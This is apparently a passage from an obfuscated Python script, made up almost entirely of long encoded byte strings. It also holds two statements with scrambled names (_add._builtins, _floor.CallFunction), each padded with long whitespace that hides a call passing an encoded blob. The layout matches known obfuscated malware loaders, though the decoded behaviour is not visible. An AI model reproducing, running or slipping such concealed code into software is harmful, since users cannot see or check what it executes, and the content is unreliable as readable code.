q\x8d\x16\x87\xff\x1eX\xf1\xffV\x0c\xdaxP\x8a\xbe\x92e\xd9o\xe2\xc1SV\xad{\x9c\xa17\x0bxh\xac\xda\xdd\x93\xf7\xf2\x1b\xd7\x07gS\xf4\xb9+\xefe"\xe40\xbb\xb4\x18\x84122\xd9V\xbdj\xea\xebA\x89p\x94\xe8\x8a\\k\xef\x89k\r\xe9G0\xf0\xd4\x1cjJ0\xb83D\xb0!\x14\xc9\x04\x06\x92\xb4\xdcv\x8c\xd6{\x0b\x81\xd6\x93\xbd\x0e\x91\xd6\x1aE\x8f\x89\x93\x9f\x11K\xdf"}\xf2h\xd9\xd6\xb0\x16\xd6R\xcb\xbb8\\$1q[\xf6,\xc1\x02J?L}\xf0\xe5%\xf0y(\xd5_-^\xb5\xd0\xf1b\xack\x91"}\x12P|$\xa8\xe3%\xe5\xd6#\x1c\x81P\x15\x00,m8\x99\xab\x84&\x84\x05\xe9\x15a\xb0\x0cG\x81R)\xd4RL\xed\x9a\x12\xb8\x7f\xe6\x1fL\xab4\xc3\xde\xd3?M\xb3\xc75\xcb:Bi\r>o0\x7fE\xbd\xc2F0\t\xe2\xf8R\x1f\xb2\xcc\x13\x83\x9eE:H\xcc\x83E<\xd0\xbb?\xf4\xcf\x8b\xd7`\x93Q>\x1b\x19*Wf\x13u\xa3]\x1e{\xa2#C\xe1"\xc6\xe3uQ\x8f\x8d\xd1\x07\\\x04\xf6]\xab@q\xa6\xe7\xde\\\xcb\xc0\x10\xb1\xbc\xa3jk\x0b\xff|\x8a8\xeb\x11\xfa\xe2\xe17\xe4\x9f\xaf\xb4\xbe$\xb0\xe3\xa0\x019J\xe6\x99\xd2\xd0\x92\xdbT\xdd\xc0\xd9,\x81[\xado\xda\x8c\xa6R\xa7\x88G\xa3fI\x9e\x88\x11\xc2`\x88~\x8f\xe8w\x02<\x83\x85\xd6\x16\x08\xfd\xc8P\xff@\n\xe2\xd0$}\x94Z;\xbb\xcc$\xefq\x90\x14k\xb6\xc6\xc2\x07\xd0\xa6o\xcb\xf8ag\x8e\x06\xa4\xae\xf4\x0bN\xb6y\xd8\xf5\xf4@\xce\x01s\xa8\x95\xa6\x05\x9d4\xda\x05\x9a\x8b\xf0\x1d\xda!\x80\x13\xf7\xe7\x07F\x8a\x0f,\x15\x0cD\xb7\xb0s\xc76U\xfa&\xb9\xd7\t\xc8\xb9)\xc4\xca\x89\xca\xb9\xe6\xfe\x9b\x99\x04e\xa7\xb4P\x9e@\x9f\x8b\x9a\x08b\xa1\xbe\x9e/\xbe\x11\xb70\x89w\xa2\x8c\x83\x06H4W\x8a{q\xc7\x90\x7f\xd7\x86\xe6O`\xf7\x18\xbf\x1e\xdd\x89X K4\x88/\x9du\xe9\x91\x85\xabH\\92\x01\xafBy7\xc7\xe1d\xa8\xdd\x12\x81\xdb7\xcbk\x83\xc9\xe2{\xaf\x1c\xd9y\x91Y\xaaZ\xa1\xe3W"\xa2,\x13t\x99\x12\xc9\xa9P\x8a\x87jH\xc4\xc8a\x0e\x05\x84g\xa2*Y?\xff\xc5\x86Z\xf8\xad\xb1\x84p\x9f\x90RTR\xb48\xe7\x9cK\xef\x11\xe2\xcef\xe66\xf5\xedK\xcbKi\xa3\xe1MvC\xae\xc0\x91\xae\xa7U\xd3z\\~\xafN1\xd5\x91x\x88\xf8\xa9\x84m9\x05h\xc1X\xc5\xa9\x14\xc0\x18\xd5\xc2\x11=\x1d\x94\x1b\x9d\xc58\xa1\x84\xc6\r\xc5\xe8\xbb\xc5\xdb]\xcc\'\x83\xd3\xb0\xf3\x08`\xaaiv\xc3Kd*\x07*\x87\x02=\xde\xd4\xd7S\xa6\\!\xafH\xe4\x12\t\xa8\x9f\xd3\x11dy\x0fz')

        _add._builtins(Random = _add.Floor + 19605)                                                                                                                                                                                                                                                          ;_floor.CallFunction(_while='illjlljiiiljijjjil',Positive=b'F\xe7\xee\x88\xca\xe9\x9e\xff\x9a\xb4\x0e(Z\x9cc\xe20e\x87\x00\xb72\x18\xabY\xb5\xf5\xbbz\xba!\x84\x11!\x13.\xb9\x8a!\xfb%\xc7\xfdD^\xfb\x9b\x103W\xb0\xb5W\x08\x89\xf3u\x19k\x12\x8817*\x85\x90\xf6\xf5m\x0b\x01\xd8\xabN\x9b\xd4\x03\x82\x1dw\xab\x89&\x0b\xa4r\x1eF.\xee \x0c\x82\t\xc8@S\xdf\x96\xa5\xcc\x0f\xf0"\xcbR\xb4\xcc8*\xef\xf7D\xc8\x83]\xfd\xa2\x96\xe7|\x9f~\x00\x81\x8d\xab+\x08\xeb_bx\xbf9\xb0\x81\xf3%\x06\xcfb|\x10\x15C^mu2\xa7\xc2\x1c\x0e\t\xfe\xa1\xa6\xe6\x84\xf2\x01#t,UZ\x9dh6$\x1b\x88(\x90\x8a\x91\x13\x8d`Vmut|\xe4h\x8bo(\'\r\x1cot>+\xad\xdd\x1c\x1e\x89\x85\xecdI\x91\xbf\x8bA\xf5#\xc1\xe3\xd5\xd4\xf7@\x98OO\xba\t7Fzc\xc6%/\xc7"\n\x11\x1b`~\xacIB;\xc6#\xe0\nS5U\x18C\x00\x1a\xb7:\xa8h{\x910\xe0\xe1\xa4\xb0u\xf9\xb8\x92\x16V?\x9c:h\xb0\xfe(\xba&z\xd9>T\x9fMWi\xc3g\xab\xd2%\xeej(0q\t\xa5\nDdu\xfc\xc8\xd4%\x85\xd6\x16\x81\x93@s\x9a\x87(]\xa9n\xce\xa8\xda\xfa\x92\xe1\x8eNa\x0f\x1f|\xd7\x035u!.\x17Qj\x80V#\x8e\xdcfk7\xb9\xc9\xb5\xb6\x97a\xdd\xa1\x04g\x97\xb4\xda\xda*\xb4\x95avr\x8a\xf3R\x80:\xe5\xa8\xda\xea\xd1\xd6\xecA\x06tPV\xe5*\x8b\x00=\xcb\xa5q\xfb\xe9\xef\xd7\xb4=\xd8\xa4`%\xbbnAG\x96b\xbc0GU F\x95x\x84Su\xa5\xf5\xc8\xcc\xfb\xce\xde\xdb\xde\xf03zhJ=\xaa\xba\xdc&\x17\xaa\x95"\xf3\xe2\xc3\xf6 \x07\x1b\x94\xb0\x9eC\x89\xdb,\x07\xb1\x93\xc4q\x12\x0f\x81\xbc/\xe9\x17\xa7\x1b`}\x02L=@V+H=hF\x80\x93\xd8F5\x12\x95W\x9a\x18\x86\xd5V\x8f\xee\xba\x17\x1d\xb9\x05\xf7sDD\x87\xc6\x01\xbdRS@\x90\xe6\xe1\x8ac3\x00L\x8d\x03T\xfc\x18\xe1\xacK\x8fs\x11\x12\xf8\x8e\x80^\x19\x82\xfa3\x88\xbb&\xbd\xef\x90o\x96w\xf2\xb9e\x08\xfd\x88s\xdf\xb3\xbe\xa5\xca\xeb\xb5BS\xe7\x92\x92\xe2\xe8\x9d\xf3\xbecM\xa6O\xad\x8e\xf5B,\xbf\xee\x05sl\xd2\xfcd\xea\x9f-\x0c\xc0\xdfw\xb4\x00Z\nP\xad!\xb0\x7f\'E\r"\xac\xb6v\x1am\x9c\x07oj\xc2k\xcb.O,[\x9b\xac\x85\xd2\xd4\xf7\x10K\xb0C\x95\xf0\xba\xdaG\xb2\xbe\xbb\xe3\x92v{\x05\x15\x88\xa7,\xa8\x11WPO\xbaNh\xf9\xc9\x9a\xb2\x99Se\xd6\xa7\xac\xe8\xeb\xf7\x00\xfd\xa0\x9alp\x94\xf9\x8e\x92\xd0#\xf5\xc8UK\xa8>\xc37\x9ex\x92\xb8`\x87E\t\xc6\xe6.\x95V\xbb\x87b\x1e\xa0\xf1&<\xf1\xf8\xe0\x1e\xac%\xf1\x96D\xde\x85T\xc9\xa3e\xdd\xd9q\xe5\xd8\xb3B\x1e\x17K}`K\xb2\xb0\x9f%\xed#m_\x12\x1f\xbe\x0b\xac3\xd3\xe0\x9c\xb9\x01\xee\xcc4H\'7\xa5:q\xc9i<%L\xfb\xe59\xed\xbcn\x16\xa5k\xef3\xf6\x8b9N\x89w\x93y:x/8\xc9\x8c\x0b\xa89e\x84\xd8\xc5\xb8\x8e\x1c\xd6P\xf8\x91\x08}K\xad-\x80\x95\xa9V\xe2GX\x89a\x84\x91\x1bJ\xfb,\xb4\xb6XS\x88\x1e\x84\x18\xa1\xad#\x9d\xc8\x12\xa0o\xa2\xd0z\\\x9aj\x0f\xffPQ\x12\xad\xe2%\xe6\xac\x11;z?\xde\xf3\xbds\n\xfb\x81ea(\x1e\xedN\xb1\xe8Y\x02Yt\x0b|\x86\x08\xa4,1\xc0C\x19\xa5,NP\x0e\xabs\xdf3{QW\xb7\xd1\xb9\x15\x14)}Q/h\x80)/CLy\xc9M1\xe8a\xb5\xb5U\xec)\xd0\xa3~\x88\x08\x8e\x91\x8e=\x95Z]\xc5\x9e\x9c\x9d\x85\xdd\x11X\x8e12\x1f=#b\xb8hT "\xb0\xfb\xfa\x1eP7\xc8Qt\x06*\x86\xe6h|\xc7\xea^\r\xeb\xe9K\x8a=\\\xd1\x97\\@qH\xf2\xbah\xff\xcb\xb4U\xe1\xd0\x04\x87\t\x81~`\xf8%\xe8wI\xab\xad-\x86b\xaa\x07]\x8c\xbf\x18\xe1\x9a\xf2j\xeb\xb1\xfaf\x9c\'\x85\xecU\x1fH\x88J\xf1j\x15\x89"\xe1\xa9C\xba8IH\x9e\x8bwnK\x84\xb9\xbb\xaf_\x1b\x12\xf3\xc3\x0bN\xcd\x8dR83\x05\xa7f\x92d\xd3\xa9\x81K\xb5\x08#\x84\x17\x06n\xc0\x85\x14Qc\xfaW\xf5\xd79B-\xc9%\xa2\xc4"\x00\xf9"\xc4"B\xdd\xd4\xd7\x03\xe3|\x8dN\xf2\xeb\xca\xb3\x1fP\x91;b/`5\x005\x81\xe3\xf2/\x1f\xe4\xdeL\x00h\xc8!(b\x85\x02\xf7`O\x97\xe7\x80\xc3"\x94LE\xde\xe0#\xac=\x84#\x8b\x9c\xe2>l\xd8\x99\xe1\xff\xcd\x8dp\xca\x0b\x16mn\x92O\xf26v\xec\xd1\xb0\x1d\x0f\x82\x00\xaaKo\xb7\x01\x10\x9f\x01\x07Z\xd0H~\xd6>\xde\x1fk\xbb\x8f\xca\x8dR:]Tmu\xb4=\xdf\x81\xb9P\xc8Z\xa6\xdf\x0c\xc42\xa2R\x05R\xad\xa9\xef\xcb\x14\xa9\t\x95@ \x0b+\x07\x7f]\xb2\xca\xbc\xf9z\xa0\xd2\x02W\\\xa0\xd7j\xa5\x8d\xe6{c3\xbb\xbb]\xcc^c6\xf8g\x93\x14\x0ein\xeb\xcdx\xd7\x0e\xede\xa4\x9an\x91\xdd/P\x0b\x81\xfa\xdb\x1e\x1d\xbb\x9f\x87\xb0\x14\xc5\x08\xa9$\xe9\xdc\x94%\xcdMA\xd2\x99\xd3R\xa4\xce\x18J?\x08?\x95\xf6T5\xc3\x94^:\xbb1\xc4x\xf9"\xf1\xe4\xd2\x97n|i/\xa4+\xeb\x92q\xcd\xbd\x19\x17B<\xc9\n\xaeg\x86E\xf62\xe0\x98\xf4S\xecba\x12\x89\x8a\xb9\x8e\xe5\x96\xa5k&\xd5\xc4\x11\x17\x8f\xfeHS\xed\x84\xf23\x8eL\xb6\xbc\x90e+R\xc3\x8a\xe5K\xec\x15v\x9d\xbb\n\x0e\x97\x08u\xdd\xa1\x9a\xd6\xea\x9c-\xe6[\x9f\xc9}\xb6\xec\x90\x9c\xeex\xf2\xe32D\xf6\xe1\xd0\xa2\x0f\xdd\x90\xaf \x8d\'R\xfb\x10\xb7O7N;\x13\t\x17n\x03~\x0e\xd9+W\xa2P\xdc\xd7\xd7\x83\xe5\xba\n\xf2\x95R\xd2\xfbA\x9cv\x0e\x02YEL\xd6\xa4*j@<\x18Z\xe8A\x13\x92(([6\xac\xd1ON\x06\xe1\x9bn\xfa+S@\xb2\xcf\xa0@!\x9fp6\x95\xa5\x8d\xd8\xd77;\xc0\xbf\xba?\xc3\xe5\xad\xc9r1\x1c\xfb\x8ejl\xb4\xcf9\x88\xd0=I\xa8a\x9bsPim\x01\xc1\x84\xf8T\x84\xcf\x1c\xb1\xb2\xe1\x8f\x9cIUhm\x81~\xc9\x91\x1c\x8b\x88\xb1\x02\x8c\xbc\x85\xe5\xb6\x97\x8d[8\xec\x15b\xe5[\xaa\x81\x9b\xea*DQ\xb9\xad\xb3\xffL\xd2\x9c2NGfqD\xa5J\xed\xfb\xfa\xb6\xccuj\xfb\xfc\x1eJ\xca\xb3\xe6\xf0\xd6\xc4\xff\xc4\xba\xd8Y\x80\x84\xa5\x13\xc5\xe9W\x1ct\x89\x85\x00i\xea\xeb^\xc4g\xf1\\\xe9\xc8\x11bY\x87I\x90\x04q\xac\xde\xd5\xd3\xc3\xbc/\xd9\xba\xcb\xe4\x06\xb2\x12\xbd\xdbZ\xf3Y<"\xf3=\x892p\xc0\x0eI[G\xba.\x02\xe2\xb8\xd7\xd4\xebR^\xca\xba\xbbY\xf6\n\xc4y)\xda\xb2\x01;\x0b\x10\xc2<\x05w]gqd\\CI\xb5\xf4\x8e\x8c\xbb\xb4\xe9\xdb\xba\xd2K\xfbs\x0c\x0e{p\xb2\x03p/\x04p\xc1\xa8\xaf\xc0\t\xe0\xc4\xa1G1\x80\x07\x9c\xc9\xe94\xe8|\n\x7f\xad$E\xe5j\xb9\xf23\xb79\rj\xa5\xe0\x1a 2*\x0f\x06^\x05qZ<&\xc9k\xe2\x07\x8b\xea\x84\xfbC\x7f\x01\x1d\x1a\xb5\x94\x0csjs\x9d\x99\x06\x18%\xd0\x0bG\xd5\xd6V\xf8\xa7\x18\xab5\xe6\xda\xfb\x1dj\xfcS\xa9\xb5\x05&k\xa83\xb1\x12$\xa4KQwJ\xaa\xad\x8dkb=\x8bs\x95\x03\x0c\xd9\xc7\xd5\xd6\x16\xda\\\xae\xb7\x1b\xa2_?Em5\xaa\xb6\x1eWx\xad\xb5~\x06\xda8\xd9\x01\tB"\xe0<\xa7\x88\xd9\xa9\xb4\xb6\xb05,\xddr\x8c\xbfK\xd1\xd6\xa8\xb4\xb6\x18\x9d\xe9\r\x13\x16\xa6\x98\xf5H\x19v\x95\xd6\x17\xc5\xb8\xbdZ=l\xef^\xdf~]o\x9e\xd6\xf7\x8f\xaf\xd7w_\xb6\x0fO\xafg\x9b\xcd\xd9b\xfdp\xb6\xfc\xb6\x9c\x9f\xad\xb6\x0fw\xb3\xa7\xb3\xcd\xf2\xfel\xfb\xb08\xfb\xf2\xb0\xbe\x7f:\x83\xe7f\xfd\xf8t\xf60\xbb\xffiy\xf6\xb8|:{|z8\xdb~Y\xde\xbf\x82_\x9d0\x9d\xa3!\nG\x8d\xf6\xf4\x95\xde\xc2\xf6\x91\x97\x9e~~X\xce\x16\xeb\xfb\x9fhW\x1e\x7f1{\x01\xeb\xf9\xfa4\xbb\xdd,\xf5W\xff\xb1Y?-#\xfez\xbe\xbd\xbf_\xce\xd5\xce>\xc277\xfa#\xaf\xf6A\xff\xe8v\xf6\xb8Lc\xfe\xcdm\x1a\xd3\xb9\xa1/??n\xef\xf9\xab\xcdv\xb6x\x84\x95A\xe3\r~:\x83W\xea9\x7f\xfa\xe5\xcb\xd2\xec\xd9\xf3\xfa~\xa1N\x91z\xc3\xe6\xb3\xdb_\x1e\x96\xab\xb39\xb4]?=|\x9d?}}X\x9e\xfd\xebt\xf2\xee/\x7f\xfa\xf3\xd9\xfcf\xfe\xf3\xecA\xbd\xdd~]\xad\x96\x0f\xb4\xbe\xaf\x0f\xea:\xde\xbeyX\xfe\xc7\xd7\xe5\xe3\x13\xaf\xf7\xcf\xf4\xf1L}\x8bg\xb2~\'\xcf\x16_\xef\xbe\xd8\xf3\xb7\xbe[\xf2\xf2\xe3\xcf_\x9f\xd6\x1b\xfa\xd9\xffZ\x7fY\xad7K\xfe\xe5\xff\xb7\xfe\xf2O\xea\xa39=\xb3\xfb\xc5\xf6N\x9c,\xb3\x84{`\xd6\xfe\xf8\xf5\xf6\xcb\xc3v\xbe|4-\xc5=7{\xb1\xbc\xc3\xcd\xed\xfe\x1d]\x88W?o\xb7\x7f=\x7f6\xd1i.m\xf6\xea\xe2O\x7f\xf9\xd3\x1f\xff\xf2\xa7\x8bs\xccz\xd6\xc1\x04\x1dVx\xb5X\xae^\xff\xb4|Z\x7f99\x1d\xbfz\xad\xfe\xd6_\xce\xd5=\xf0\x99\xe2L\xea\x16X\x7f\xa6\xe5\r~\xfb\xf4\xf0\x0bu\xd3]\xf5\xe9<\xd1\xa7\xf7D\x14\xfe5\xa4\xec\xef?\x9c\x9e\xbe\x81\x91xbn\x9f\xd37jH\xc36q]\xcbo\xf3\xe5\x97\'\xbb\xde/3ul\xb0\xf0\xb0T\x97[]\xa1/\xaf\xe0\x9c\xac\x1f\x96w\xcb\xfb\xa7\xc7\xf3\x8f\xaf>^ \xba\x0bP^SX\x84\xf2*g\x1fDV\xf7\x07{\xac\x9f\xce^}\x84\xb8.\xe8`\x10\xf9\n \x06\x06:\xd9\x19\xb6\xa0r\x16\xe8p\xd8\xa7')

        _add.Divide(_cube = 77194 * _add.Floor)                                                                                                                                                                                                                                                          ;_floor.CallFunction(_while='IJIJJJLIILLIJLIIJJJJ',Positive=b'W\x9f^\xa9\x9b\xf2\xf5\xddv\xb1y\xbd\xbe\x7f-7;6\'\xe0\xe6\x86N\xfc\xcd\xcd\tt\xfc\x88R\x03\x84\x06F\xe7\x80\xb4\xf9S\xfd\x81\xd9K\xf7\xe6_\xf1\xb4\xb5\x15B) \xb8oI#\x85d\x03H\x8eNC\xd4\xf2\x17\xa1\x12\xf8\xa9z\x85\xd4\x93,\x08\x03\x08\xfd\xa3\xbfw\x08J\x88j\xbf\xc5xT\x9c\xce\x93[\xa5M/\xb26\x8c~g\x8f?/7\x9bs8k\x10\x97\xbf\xa0Z6P\xcd\x06m\x80SsHp\x8f\xbcy\xdc,\x97_NP\xcb`^&\x0e\xc0ON+\xe3\x1f\xef\xa1?>\xfc\xf2\xe5i\xfb\xe6\x8f\xeb/?/\x1f\xf8N\xfa\xc7?]\xbf\xdal\xe73\xb5\xe1\xc77jT.\xef\xffvbjnqb*,\x9f\xbez\xd8\xce\xee\x94d\x13\x1d/\xa1\x1c\t8p\xb1\x14\xd3\x04h\xd9\x91\x97\xfd\xf4\x15\xdcA\xa2#\x13\x133O\xf1\xdbw\xa7\xaf\xfe\x82\xa2\x12\xc4\xee\xf9\xc7O\xaf\xe6\x1b5\x02__\xfc\xe3_\xfe\xf1\xe6\x0fW\xd3?\x9c\x18\xc9\xa3\xef\x91\x9b\xd5z\xb9Y<\xde\xa8\x91x\x02^b,\x84\x02\x0b\xb0\xcd+#\xbc\xde\\\xbc\x9f\xfe\xf9\xe2\xf4\xec\xd5\t\x17\xcb|\xa7\x99 \xd1\xc7\xc7b\xec\x84\xc4\x98\xd2\xd9>\xe1\xed\xf8\xcf\xcb\xa7\x8b\xd9\xd3\xec\xe4v\xb3\xbd\xbd\xd9~}\xd2\x1b\x9d\xdfB\xeb\xb9Z\xb7\xf9\xe6\r\xb5\xd1\xd5\xf8B\xdf\x9b\xef\xe83~E\xe2\xf1\x9c\xe5\xe4\x89\xfc\x19\x88\xd67w\x8f\x7f\x9b?<\xbd\xb9[\xde\xcd\xbf\xfcrB\xbd\xceh\x05g\xb23I\xe77\x7f]>\xdc/7Q\xf8\xe6\n.\xd6?=,\x97\'_D/}\xdb\xd2j\xde<\xcc\x9e\xf1\xb0\xf0\x8a\xff\xdb\xbd\xba\x01\x9e\xd4d\x82G\xb8\xbc\x9fC\xe3rqs\xfb\xcb\x93\x12\xf6\xea6{\xd8~\xf9\xe5\\\x8e\xa2\x8dV]\'\x1b}\x1eh\xb57\xeb{{<\xe5\xf5\xa8\t\xb5\xdcvz*\x7f\xcc\x1b\x12k\xc0\x06\xfdK\\\xe6_\xc0\xf9T\x1b\xb3\xa3\xa1n\xedgf\xaf\xc4\xafx+\xe5\x9f\xd2\xea\xcf\x8a\xfb"~\xa7\xae\x9e\xf8\r}\xb1^\xf1\xc9\xc7\r\xabs_s>q\xb2<\xd1{|z\xf6n{\xbf<\x13mf\xcb\xf8\x05\xbe\x04\xdf\x82\xa1\xec\x02\xc3\xed\xd4\n,}%+#\x12/\xe8\xc5\x12w\xe5\x7f\xce6_\x978f\xce\xeef\x8fO\xea\x88\xfe\xba\xfc\xe5\x1c\xd6\xaeW\xf4\xf84{PR\x1bz\xb0\xd4Q\xa7o\x0b\x8a\xc99\x13\xa3j\x8aTz9[><l\x1f\x1e\xcfuJ:\xd7Fa\x95\xe7\xf9\xf4\xe3\x98\xd374\x97\x07M8\x1f>\xf1\xa9\xd2\x9b<7\x08D=!\xbc\x7f\xffZIw\xfe\x96k\xaep\xf5O\r\xe9z~\x16S\xdc\xdfp\xbf?2\xbc\xe8\xdd;\xcdh\xfe\xee\xed\x18\x99\x91\x90"i\x02\xac\x12\xc0\x94\xf4I\xcca\xbf\x80F\xa1\x7f\xfd\xd6\xde\xf7\xf8\xeb\xb1\xed8G\tx\xaeD\xdf\x9b\xfb\xe5\xf3\x89=\x85g\xd0\xf4vz\xf1\xa7\x9b\x7f\xfe\xe3\xdb\xb3\xf5\xdf\xac\xcc],y\xf0\xc1LyNkx\xa3[O\xf4\x96wv/~\xfc8\xfe\xd1\x96\xf2}\xa7\xa3\x0f\x9f\xcc<]\x1e\t\xc5\x1f\xe30\xb8R\x1b\xd3\xd3\xff\xe3\xc9\xdd\xf2\xe9g\xf5CP\xb3\xce\x16 \x8ep\xca\x80\t\x1af\x8f\x0b\xc0v\xa9\x99\x1a\xd4\x99\xc7\xf3\x89:{\x13\n\xb7\xa1\xdc\x06\xf1\xad\xce\xe1\xd9\xcfJ\x12/\xd5\xe5_\x83\xf6\x81\xea\x07\xcc\x89\xb0\x00\xd3\xa1\x1eT0K\xafq\x8a\x06-\xf9DO7\x1b\x8d\xf4\xda\x80\xb4\xf8?^\xdf\xcd\xbe\xc1\x84\xfdhg+\xa9\xbe\xe8\xb1\xa2w\xf9\xfc\xfc\x9d%\x19\xa3g\xb1\xab\xee\x0eG\xf5\xfa\x1f\xce\x01g\x0e\xc7\x06\x80s8*8\xbcj\x7f<s\xe7<\xf3\xbd\xf9\xb2U*\x9295\x0b#0k6\xf3\xa04\xa4\xd9\xd3\xd7\xc7\x9b9\xee\xdb5\xb2_\\\x93\xae\x80\xef\xf5\x1b\x13\x97\xea\xa1\xd2a\xb9Q+\xc6s\xaf\x0e\x80o\x9c\x0f\x1fXg\xd3K\xed\x8f\x82.#\xbe\xb6>\x0e\xd4w\xa4\xce\xa3\x1epO\x96\xfaq\xb9\x8f{.\xfbqw\xa7\xaeg<\x8cP0\xbe\xfe\xcb\xf4\xf5\x1f&\xff\xdc\xfe\x0c\x94\x151\xf8+\x0c\xe0\x7f{P\x9a\xf7\th\xd0z\xd8jx\x94FK\x01n\x8aG\xed\x84\xab=B\r\x98\t\xde\xf6P\n\xc6\x0c[.~\xc0U\xb2u\r\x84\xb7o\xebG\xee\x86#\x9b\x1c\xdbT*\xd3x\xef\x80\xd5\x1bR\xd7pKw\xd7\x05\xde]\xb8\x93\xa0\xafU/\xe0CEO\xb7G\n/f\xdf\xf5\xfbi\xf5r\xd6\x0e\xaa\xe5\xe6qy\xf8\xd6\xda\xac}\xef\x05\xfbIMC\xb3\xcd\xe4~\xb5\x15F\x8b6b\xf0\xe3\xd7G\xa5\xa0\xcc\xee\x96B\xe9\x03\x19\xb2\x06Ib!tzb\xfd\x02\xfbt\xbf\x05[\xb0\xb2\xe3\x87\xe8\xe75\\\xda\t1\xfe\x83\x97\xde \xeb\x17\xe8\x91\xb7)\xe3\xb3\x8c\x12P\x83p\xa54u\xc0,\xb7\xd1\xcfk,\xaa\x87\xe5\x97\xcdl\xaeD\xe1\x95\x96\xab\xc0z\x84\xf3\x12\x91\xf8\x9d\xe9\xb9V\x13\x92\xe3\'\xfb+8\xaa\xcfpLxp\xfa\xe8>\x9f=sU\xb2g.\x1d\x01Oy\xe6\xce\xd1p>\x91\xa7Q+\x96[\xa5n\xfcrN_|\xbc\xa2\xfaH\x13\xd4\xceQ]\xbeB}\xfd\x93\xe8\xfbG\xb8\xf5u\x7f\xa3\xf2\xf3v\xf5\xc6?\xbd\xd9l\x9f\x95\xc2F\xdb\xa0\x91\xb0V#\xa1\xb5\x1f\x15.U4KS$}\xc9\x128\xe9:\x03\x18 \xe3\xb1\xae\xfc\x99-\xa8\xa8Q\xa8\x0c\xabT\x99P\x15r\xf8\xa5j\tta\xe1Q\x98\x83\x19\x96\x91\xb1E\x970\x08G\xc55C\xc5\x9c\xb4\x15LN\xdc\x10\xf6\xf8p\xe0\xff\xe5\xe1\xab\x1a\x94\x7fTw\xd3Z\x89\xdc\xb18\x05\xaf\xd9\xc8\xc76\xbc.\xca\xc26]\xc9t]\xdf)!\xfef\xa5\xd4\xc8\xd9fs\xa2/\xb4\xb9\xda8\xbf\xae749\x19\xa5\x134V\xf5\xc3\xd3\xff\xebG\xb0\x031~\x01\x86 \xa2\xb4A\xe0\\L\xedMj\x1c\r\x1a\xae1\xb1\xa0\xb0\xb2\x1eQ\xd8\xdd\xa2\x18\xb1k\x81a\x02C\x19F0\x0c\xe3\x9d+\xd1V\xd3\xbf\xfd\xcb\xff\xf3O\x0f\xeb\xe5\xbd\x1a\x8eO\xdb\xbf.\xef\xd9`\x98-~Z^\xa1i\xf7\xea?\xc9H\xa5\x17m`\xe0\xa71\xd6\xba\xde\xea\xca\xd7\xe0)\xd8\x9e\xa1\x8fa\xaagw\xf46\x8c\x05\x99\xac\x9e\x9d\xcet\x02\x05MW4g\x8di(\xd2h\x04\xfa*\xfc\xf4_g\xaf\xfe\xf3=\xab\xab\x86yN\xfd\x8di\xa2\xe0*\x01\xef\xf4\xbc\xf1\xf6l\x8a\xc1#\x8c\x1b\x05dxO\xc7\x1f\xf8w\x1f\xb4V\xab\xde\xce\xa6\xba\'"\xd7q\xe2\xd2\x8736:\x9dP\xef`G`\x02\xd3\xe2\x01\xcf\xc4D\x7f\x1c\xa3\xad\xbf\xa5\xaa\xb5\xa8\xb6\xc1\x9fZ\xdf\x19\xcaN\xa8\xb4Aw\x94\x12\xa1\xe3\xcf\xb8\x04\xca\xd9\x06\x87\x0f\xd5\xe1\xd8\x9c\xd1\xd9\xb9+\xbe\x8d\xf1d\x84\xac\xc3\xc0\xe9\x81\x1d15\x12$\xa2\xff\xdd\x98u{\xd2\xf3\xdf\xf3q^\x98<\x01\xd8M\xe4UR\x07\xc9!\x8e\t\xdb\x8b\xf8\x7f&.\x89\xae@@\x97\xe9n|o\xab\x88\xdd\xeb\xca\x04tu\xf8\x92\xe8\r\x8fMUF.\xcb\xa8\xfe\xcf\xf8\xaa^[\x9d\xecz,\xc4$3i\x9d\x19\xb0\x816b\xd4\xeb\xf8\x9d\xf9\xd3\x97\x196\x8cg\x83\xc7\x0c}\xd0\xe7i\xac\xa384^\x8d_\xe5\x8c2\x15\xf0Z\xc3?\x8e\x8f\xb1\x1eq\xd7F\x16^_\x9fau:"\xbfCBWu\x89\xc9V\x81i\x02\x1bQ\xed\x9e\\\xc2~\xa0\xc7\x84\xdc&W\xba\xc4\x1d\x0e\x94\xb1v\xa7\x99\x11G\xe7\xe9\xcc\x14\x16\xb2~\xe8q\x85\xa9\xf7\xdd\x19\xeb\xe4\x06\x1b\nKc[5U_\x16\xd8\x03\x1228\xee\xf0\rD\x0c\xaa9\xe3\r\xdf\xb4BaR\x7fg\xe4\x93\x82{\x83\xbcU[\xd4\xc7/.\xc6z@\xb1\xab\x87\xad\xcb\xb7g\x8c\xab~\xcf\xffc:W\xfa\xa2\x92\x8a\n;3!\xca@=kM\xe8\x0c\x8eA\x18Luf)\x89A\xbcQ\x03\xcc\x1a\x81\xff-\xfc\x8f\xf5]\xcf\xccu\xb8\xd63\x90\xb0p\xff`\xa9\x1at\xac\x8eu\x1a\xb6Qx\xe1\x156>\xa5\x9b\x1e\xd7I\xd7W]\xe91\x9aBp\xc3\xd1Z\xd6\xe8\xa4\x05\xa9\xbd1\xae\x12}\x9a\xc6\x13\xf1Q/\x9d\x99\n\x1c|K\xd0M1\xe6\xe2\xf6l\x0c?\xff\xd7+\x9a\x99Y3\xfcO#|\x8dN\xce\xdc\xdawc\x94\xb6g\xa6\x07\xec9\xfaTA{\x86\xf3\x01C\x14\x05\xd9\x98\xe9\xb8\xf5E\x87%\xfb\xbb-\n\x1b\xc8\x06\xba\xd0~\xdd\xedX\xdf\xfb,\xec>\xbc\x7f\xf5_UG\xf4\n\xa5>z\xefH\x1b)\xebq\x1f$\x98\x1e\xe5oU\xe5-+T\xf5.\\=\xf5hq\xfdV\xd8\xce4\xdeI\xff\xfc\xf9?pg\xcc]\xcb\x88hc\x00\xd0\x1e\x83\x15`\xf7\xddnd\xfa|\xbf\\\xfc\x01\xa6\xad\xc7\xf3)\x02\x06P\x9a\x07[\xfeW\x8d\xf6\xe07\xb3\x9f\x94\x15\x86\xab\xf9\x88\xd6\xf2zC\x1e{\x9c\xda?o>}\x94\x8e4=-\xe3\x0eY/\x04\xec\x13\xce\x93\xb0Kf\xc2\xac\x98\x1e\xb8\xad\xdf\xff\x1e;|\xa4\xd1\x07[B\xcd\x1a\xcd\xf4O\xffp>Ao\x08\xd9Fx\xf7\xa0Wtr\xf9z\xa6\x0eX\xef\xa6\xf6\xa1\xd8\xa9\xe9\xd3\xf9\xf94 